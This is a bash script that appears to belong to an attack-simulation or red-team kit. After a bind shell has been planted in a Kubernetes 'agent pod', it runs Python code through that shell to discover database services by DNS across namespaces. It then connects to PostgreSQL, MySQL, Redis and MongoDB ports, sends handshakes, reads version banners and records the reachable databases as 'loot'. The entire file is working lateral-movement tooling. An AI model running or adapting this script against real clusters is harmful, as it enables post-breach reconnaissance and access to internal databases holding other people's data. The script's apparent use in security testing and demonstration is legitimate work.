#!/usr/bin/env bash
# Lateral movement: discover and attempt connections to database services.
# Uses DNS discovery + TCP socket connections to common DB ports.
set -euo pipefail

if [[ "${1:-}" == "--help" ]]; then
  echo "Usage: attack-lateral-db.sh"
  echo "  Discovers database services via DNS and attempts TCP connections."
  echo "  Tests PostgreSQL, MySQL, Redis, and MongoDB."
  echo ""
  echo "  Requires: bind shell open (run trigger.sh + wait-shell.sh first)"
  echo ""
  echo "Environment:"
  echo "  AGENT_NS     agent namespace (default: agent-namespace)"
  echo "  BIND_PORT    bind shell port (default: 4444)"
  exit 0
fi

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/lib.sh"

banner "Post-Breach: Lateral Movement (DB)"
echo "@PHASE Lateral-DB"

PYTHON_CODE='
import socket, sys

print("@PHASE DB-Discovery")
print("=" * 60)
print("  LATERAL MOVEMENT: Database Discovery & Connection")
print("=" * 60)

db_targets = [
    ("postgres",       5432, "PostgreSQL"),
    ("postgresql",     5432, "PostgreSQL"),
    ("mysql",          3306, "MySQL"),
    ("redis",          6379, "Redis"),
    ("redis-master",   6379, "Redis"),
    ("mongodb",       27017, "MongoDB"),
    ("mongo",         27017, "MongoDB"),
]

namespaces = ["target-apps", "default", "monitoring"]
connected = []

for svc_name, port, db_type in db_targets:
    for ns in namespaces:
        fqdn = f"{svc_name}.{ns}.svc.cluster.local"
        try:
            ip = socket.getaddrinfo(fqdn, None)[0][4][0]
        except socket.gaierror:
            continue

        print(f"  Found {db_type}: {fqdn} -> {ip}:{port}")
        print(f"@FINDING medium {db_type} service found: {fqdn} -> {ip}:{port}")
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((ip, port))
            print(f"    TCP CONNECTED to {ip}:{port}")
            print(f"@FINDING high TCP connection established to {db_type} at {ip}:{port}")
            print(f"@LOOT db-access {db_type}:{fqdn}:{port}")

            if db_type == "Redis":
                s.send(b"PING\r\n")
                resp = s.recv(64)
                print(f"    Redis response: {resp.decode().strip()}")

            elif db_type == "PostgreSQL":
                # PostgreSQL startup message (version 3.0)
                import struct
                startup = struct.pack("!II", 8, 196608)  # len=8, protocol 3.0
                s.send(startup)
                resp = s.recv(256)
                print(f"    PG handshake: {len(resp)} bytes received")

            elif db_type == "MySQL":
                resp = s.recv(256)
                if resp:
                    # MySQL greeting packet contains version string
                    version = resp[5:resp.index(b"\x00", 5)].decode(errors="replace")
                    print(f"    MySQL version: {version}")

            connected.append(f"{db_type} at {fqdn}")
            s.close()
        except Exception as e:
            print(f"    Connection failed: {type(e).__name__}: {e}")

print()
if connected:
    print(f"  Successfully connected to {len(connected)} database(s):")
    for c in connected:
        print(f"    - {c}")
    print(f"@RESULT success Connected to {len(connected)} database(s)")
else:
    print("  No databases were reachable.")
    print("@RESULT success No databases reachable (scan complete)")
print()
print("Lateral movement scan complete.")
'

echo "  Piping DB lateral movement script to agent pod..."
echo ""
run_on_agent "$PYTHON_CODE"
echo ""
echo "Database lateral movement complete."
